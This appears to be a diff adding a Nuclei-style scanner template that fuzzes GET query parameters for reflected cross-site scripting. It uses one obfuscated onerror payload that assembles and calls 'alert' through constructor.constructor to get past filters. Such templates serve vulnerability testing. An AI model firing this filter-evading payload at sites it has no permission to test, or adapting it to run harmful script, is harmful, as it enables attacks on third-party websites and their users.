@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-onerror
+
+info:
+  name: Reflection XSS Detection with OnError
+  author: netbaan
+  severity: low
+  description: |
+    This template tests for reflection XSS vulnerabilities using an onerror attribute payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss:
+        - "onerror=\\\"x='ale';z='r';y='t';p='\\`XSS\\`';new constructor.constructor\\`zzz\${\`\\${x}\\${z}\\${y}\\${p}\\`}\`bbb\\\""
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "XSS"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
